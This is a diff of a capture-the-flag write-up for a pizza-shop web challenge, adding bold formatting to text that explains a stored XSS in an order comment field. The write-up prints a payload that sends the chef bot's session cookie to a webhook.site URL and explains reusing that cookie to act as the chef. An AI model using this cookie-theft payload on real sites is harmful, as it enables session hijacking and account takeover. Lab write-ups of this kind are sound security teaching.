@@ -12,11 +12,11 @@
 
 ### Recon
 
-When you open the webpage, you are greeted with a simple webshop where we can order pizzas. Before ordering we can input a custom comment on the right side:
+When you open the **webpage**, you are greeted with a **simple webshop** where we can order pizzas. Before ordering we can input a **custom comment** on the right side:
 
 ![pizza shop](image.png)
 
-Notice we cannot order the Flag item. Only chefs can access this item. When looking at the source code, we see that the authorization is stored in a `chef_session` cookie, which isn't protected by the `http-only` flag:
+Notice we cannot order the **Flag** item. **Only chefs** can access this item. When looking at the source code, we see that the authorization is stored in a `chef_session` **cookie**, which isn't protected by the `http-only` flag (!):
 
 ```go
 func handleChefLogin(w http.ResponseWriter, r *http.Request) {
@@ -35,7 +35,7 @@ func handleChefLogin(w http.ResponseWriter, r *http.Request) {
 }
 ```
 
-The source code also reveals that there is a bot that views every order that is being placed, while being logged in as chef:
+The source code also reveals that there is a **bot** that views every order that is being placed, while being **logged in as chef**:
 
 ```py
 def visit(order_id: str):
@@ -62,21 +62,21 @@ def visit(order_id: str):
 
 ### Vulnerability
 
-The bot visits the `order-confirmation` endpoint. While the `Comment` section is vulnerable to stored xss:
+The bot visits the `order-confirmation` endpoint. While the `Comment` section is vulnerable to **stored xss**:
 
 ![confirmation](image-1.png)
 
 ### Exploit
 
-Now we can exploit the xss vulnerability in the `Comment` section to exfiltrate the authorized `chef_session` cookie from the chef bot using [webhook.site](webhook.site).
+Now we can exploit the xss vulnerability in the `Comment` section to **exfiltrate** the authorized `chef_session` cookie from the chef bot using [webhook.site](webhook.site).
 
-This is the payload I used:
+This is the **payload** I used:
 
 ```html
 hi<img src=1 onerror="window.location='https://webhook.site/55fc4743-809d-4f5f-bf6d-7a7cae9dec6f?x='+document.cookie;">
 ```
 
-This results in a request being made that leaks the cookies. We can use this cookie in our own browser to essentially become logged in as chef, and finally order the Flag from the chefs view!
+This results in a request being made that leaks the cookies. We can use this cookie in our own browser to essentially become logged in as chef, and finally order the **Flag** from the chefs view!
 
 <details>
 <summary>Yes! We got the flag:</summary> 
